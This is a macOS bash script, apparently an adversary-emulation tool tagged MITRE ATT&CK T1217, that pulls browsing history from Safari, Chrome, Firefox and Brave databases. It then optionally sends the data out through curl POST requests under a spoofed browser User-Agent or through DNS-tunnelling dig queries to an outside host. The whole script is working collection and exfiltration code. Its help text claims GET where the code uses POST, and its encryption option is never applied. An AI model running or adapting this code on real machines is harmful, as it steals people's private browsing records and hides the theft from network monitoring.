# Script Name: browserHistory.sh
# MITRE ATT&CK Technique: T1217
# Author: @darmado | https://x.com/darmad0
# Date: Sun Sep 15 19:17:19 PDT 2024
# Version: 1.0

# Description:
# This script extracts browser history from Safari, Chrome, and Firefox on macOS systems.
# It is aligned with MITRE ATT&CK Technique T1217: Browser History Discovery.

# Global Variables
NAME="browser_history"
TTP_ID="T1217"
LOG_FILE="${TTP_ID}_${NAME}.log"
LOG_ENABLED=false
VERBOSE=false
ENCODE="none"
ALL=false
START_TIME=""
END_TIME=""

EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""

SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false

# Function: Display help/usage message
display_help() {
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  -h, --help                Display this help message"
    echo "  -v, --verbose             Enable verbose output"
    echo "  -a, --all                 Extract history from all browsers"
    echo "  -s, --safari              Extract Safari browser history"
    echo "  -c, --chrome              Extract Chrome browser history"
    echo "  -f, --firefox             Extract Firefox browser history"
    echo "  -b, --brave               Extract Brave browser history"
    echo "  -l, --log                 Log output to file"
    echo "  --encode=TYPE             Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
    echo "  --exfil=URI               Exfiltrate output to URI using HTTP GET"
    echo "  --exfil=dns=DOMAIN        Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)"
    echo "  --encrypt=METHOD          Encrypt output (aes|blowfish|gpg). Generate key"
}

# Function: Log messages
log() {
    local message="$1"
    if [ "$LOG_ENABLED" = true ]; then
        echo "$(date +"%Y-%m-%d %H:%M:%S") - $message" >> "$LOG_FILE"
    else
        echo "$message"
    fi
}

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64|base64)
            echo "$output" | base64 | tr -d '\n'
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# HTTP Exfiltration 
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    
    # Always base64 encode the data before exfiltration
    local encoded_data=$(ENCODE=base64 encode_output "$data")
    
    # Use POST method for all data
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri using POST"
        curl -X POST "$uri" \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
             -d "d=$encoded_data" \
             -v
    else
        curl -X POST "$uri" \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
             -d "d=$encoded_data" \
             -s
    fi
}

# DNS Exfiltration
exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63

    dig +short "${encoded_id}.id.$domain" A > /dev/null
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    dig +short "end.$domain" A > /dev/null
}

# Encryption function
encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Function to extract Safari history
safari_history() {
    local safari_db="$HOME/Library/Safari/History.db"
    local output

    if [[ -f "$safari_db" ]]; then
        output=$(sqlite3 "$safari_db" "SELECT url, visit_time FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id;" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Safari browser history"
            echo "$output"
        else
            log "Error: Unable to extract Safari history. Authorization might be denied."
            echo ""
        fi
    else
        log "Error: Safari history database not found."
        echo ""
    fi
}

# Function to extract Chrome history
chrome_history() {
    local chrome_db="$HOME/Library/Application Support/Google/Chrome/Default/History"
    local output

    if [[ -f "$chrome_db" ]]; then
        output=$(sqlite3 "$chrome_db" "SELECT last_visit_time, url FROM urls;" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Chrome browser history"
            echo "$output"
        else
            log "Error: Unable to extract Chrome history. Authorization might be denied."
            echo ""
        fi
    else
        log "Error: Chrome history database not found."
        echo ""
    fi
}

# Function to extract Firefox history
firefox_history() {
    local firefox_db=$(find ~/Library/Application\\ Support/Firefox/Profiles -name "places.sqlite")
    local output

    if [[ -f "$firefox_db" ]]; then
        output=$(sqlite3 "$firefox_db" "SELECT url, last_visit_date FROM moz_places;" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Firefox browser history"
            echo "$output"
        else
            log "Error: Unable to extract Firefox history. Authorization might be denied."
            echo ""
        fi
    else
        log "Error: Firefox history database not found."
        echo ""
    fi
}

# Function to extract Brave history
brave_history() {
    local brave_db="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
    local output

    if [[ -f "$brave_db" ]]; then
        output=$(sqlite3 "$brave_db" "SELECT last_visit_time, url FROM urls;" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Brave browser history"
            echo "$output"
        else
            log "Error: Unable to extract Brave history. Authorization might be denied."
            echo ""
        fi
    else
        log "Error: Brave history database not found."
        echo ""
    fi
}

# Main function
main() {
    local output=""

    if [ "$ALL" = true ] || [ "$SAFARI" = true ]; then
        output+="$(safari_history)\n"
    fi

    if [ "$ALL" = true ] || [ "$CHROME" = true ]; then
        output+="$(chrome_history)\n"
    fi

    if [ "$ALL" = true ] || [ "$FIREFOX" = true ]; then
        output+="$(firefox_history)\n"
    fi

    if [ "$ALL" = true ] || [ "$BRAVE" = true ]; then
        output+="$(brave_history)\n"
    fi

    if [ -n "$output" ]; then
        if [ "$ENCODE" != "none" ]; then
            # Apply the specified encoding
            output=$(encode_output "$output")
        fi

        if [ "$EXFIL" = true ]; then
            if [ "$EXFIL_METHOD" = "http" ]; then
                exfiltrate_http "$output" "$EXFIL_URI"
            elif [ "$EXFIL_METHOD" = "dns" ]; then
                exfiltrate_dns "$output" "$EXFIL_URI"
            fi
        else
            echo -e "$output"
        fi
    fi
}

# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -a|--all) ALL=true ;;
        -v|--verbose) VERBOSE=true ;;
        -s|--safari) SAFARI=true ;;
        -c|--chrome) CHROME=true ;;
        -f|--firefox) FIREFOX=true ;;
        -b|--brave) BRAVE=true ;;
        -l|--log) LOG_ENABLED=true ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            ENCRYPT_KEY=$(openssl rand -base64 32)
            if [ "$VERBOSE" = true ]; then
                echo "Generated encryption key: $ENCRYPT_KEY"
            fi
            ;;
        *) echo "Invalid option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

# Start the main function
main
